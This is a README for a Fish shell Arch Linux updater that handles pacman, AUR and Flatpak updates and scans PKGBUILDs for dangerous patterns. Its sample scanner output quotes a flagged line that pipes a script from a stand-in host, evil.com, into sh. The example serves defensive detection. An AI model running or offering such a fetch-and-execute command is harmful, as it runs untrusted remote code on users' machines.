# 🧠 Ultimate Arch Updater (Fish Shell)

[![Shell](https://img.shields.io/badge/shell-fish-blue)](https://fishshell.com)
[![License](https://img.shields.io/github/license/karanveers969/ultimate-arch-updater)](LICENSE)
[![Last Commit](https://img.shields.io/github/last-commit/karanveers969/ultimate-arch-updater)](https://github.com/karanveers969/ultimate-arch-updater/commits/main)
[![Made with ❤️](https://img.shields.io/badge/made%20with-%E2%9D%A4-red)](#)

A single-command, secure, and fully automated Arch Linux updater written for the Fish shell.  
It handles official repositories, AUR packages, and Flatpaks, performs safety audits on PKGBUILDs, cleans orphans and caches, and produces a concise system summary.

---

## 📑 Table of Contents

- [🚀 Features](#-features)
- [🔒 Security & Disclaimer](#-security--disclaimer)
- [🧩 Requirements](#-requirements)
- [⚙️ Installation](#️-installation)
- [🕹️ Usage & Command-Line Flags](#️-usage--command-line-flags)
- [🧠 Configuration](#-configuration)
- [🔄 Execution Flow](#-execution-flow)
- [🧾 Example Output](#-example-output)
- [📜 License](#-license)
- [👤 Author](#-author)

---

## 🚀 Features

- **Customizable AUR Safety Scanner**: Inspects `PKGBUILD` and `.install` files for dangerous command patterns before updating.  
  Allows you to whitelist trusted packages and create exceptions for known-safe commands.
- **Selective Updates**: Suspicious packages are skipped automatically so the rest can update safely.
- **Comprehensive System Update**: Handles `pacman`, AUR helpers (`yay` or `paru`), and `flatpak` in one unified command.
- **Automated System Cleanup**: Removes orphans and clears package caches from `pacman` and AUR helpers.
- **Optional DNS Integration**: Ensures secure DNS connectivity via Cloudflare (with `onedns`).
- **Command-Line Control**: Provides flexible runtime flags for interactivity, forced updates, or selective execution.
- **Final System Report**: Prints a concise post-update summary with counts and any skipped packages.

---

## 🔒 Security & Disclaimer

This script is a tool — **not a replacement for vigilance.**

- **Manual Auditing Recommended:**  
  The built-in scanner detects common malicious patterns but cannot guarantee total safety.  
  Always inspect new or unfamiliar AUR `PKGBUILD`s manually.

- **Not 100% Foolproof:**  
  Pattern-based detection can be evaded by obfuscation. Treat results as guidance, not certainty.

- **Use at Your Own Risk:**  
  The author is not responsible for any damage caused by malicious packages or misuse.  
  Provided *as-is*, without warranty.

---

## 🧩 Requirements

| Component | Purpose | Required |
|------------|----------|-----------|
| **Fish Shell** | Executes the updater function | ✅ |
| **pacman** | Core package manager | ✅ |
| **yay** or **paru** | AUR helper | ✅ (one required) |
| **onedns** | Optional Cloudflare DNS setup | Optional |
| **flatpak** | Optional Flatpak updates | Optional |
| **pacman-contrib (paccache)** | Cache cleanup utility | Optional |

---

## ⚙️ Installation

Clone the repository:
```bash
git clone https://github.com/karanveers969/ultimate-arch-updater.git
cd ultimate-arch-updater
```

Install the updater function:
```bash
mkdir -p ~/.config/fish/functions
cp update.fish ~/.config/fish/functions/update.fish
```

Run the updater:
```bash
update
```

---

## 🕹️ Usage & Command-Line Flags

The script supports several command-line flags for flexible execution.

| Flag | Alias | Description |
|------|--------|-------------|
| `--interactive` | `-i` | Run in interactive mode. All package installs require manual confirmation. |
| `--force-aur` | `-f` | Force-update all AUR packages, even if flagged by the scanner. |
| `--skip-dns` | — | Skip the Cloudflare DNS check, even if enabled in config. |
| `--quiet` | `-q` | Suppress most informational output for minimal console noise. |
| `--help` | `-h` | Display usage help and exit. |

### 🧩 Examples

**Standard, fully automated update:**
```fish
update
```

**Interactive mode — review all upgrades before install:**
```fish
update --interactive
```

**Force update flagged packages (after manual verification):**
```fish
update --force-aur
```

**Skip DNS setup entirely:**
```fish
update --skip-dns
```

**Quiet mode for scripting or cron jobs:**
```fish
update --quiet
```

---

## 🧠 Configuration

All settings can be modified by editing the top section of  
`~/.config/fish/functions/update.fish`.

### `CONFIG_TRUSTED_PACKAGES`
Whitelist specific AUR packages to skip scanning.

```fish
# Example
set -l CONFIG_TRUSTED_PACKAGES betterbird-bin localsend-bin octopi
```

---

### `CONFIG_EXCEPTION_PATTERNS`
Whitelist specific command substrings that might trigger false positives (e.g., safe installers).

```fish
# Example: Allow the official Rust installer (curl | sh)
set -l CONFIG_EXCEPTION_PATTERNS 'sh.rustup.rs'
```

---

### `CONFIG_DNS_ENABLED`
Enable or disable Cloudflare DNS connectivity (can be overridden via `--skip-dns`).

```fish
set -l CONFIG_DNS_ENABLED true
```

---

## 🔄 Execution Flow

1. Connects to Cloudflare DNS (if enabled).  
2. Updates official Arch repositories (`pacman`).  
3. Scans all AUR packages for suspicious patterns.  
4. Updates AUR packages, skipping flagged ones.  
5. Updates Flatpaks.  
6. Removes orphaned packages.  
7. Cleans caches (`pacman`, `yay`, `paru`).  
8. Prints a concise system summary and security report.

---

## 🧾 Example Output

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🧠 Scanning AUR Packages for Security Issues
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 Found 25 AUR package(s). Scanning...
  - betterbird-bin (whitelisted, skipped)
🚨 CRITICAL: Suspicious pattern in 'some-bad-package' (PKGBUILD)!
   Line: curl http://evil.com/script.sh | sh

⚠️  Found 1 suspicious package(s). Review /home/user/.aur_security_scan.log

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🧠 Updating AUR Packages
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⛔ Suspicious packages detected; they will be skipped.
   - Skipping: some-bad-package
:: Synchronizing package databases...
[...]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🧠 System Update Complete
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Status:
  - Explicit Packages: 288
  - AUR Packages:      25
  - Flatpak Apps:      3

🔒 Security Alert: 1 suspicious AUR package(s) detected.
   The following were SKIPPED:
     - some-bad-package
   Review log: /home/user/.aur_security_scan.log

done ✅
```

---

## 📜 License

**MIT License** — see [LICENSE](LICENSE) for details.

---

## 👤 Author

**Karanveer**  
🔗 [https://github.com/karanveers969](https://github.com/karanveers969)
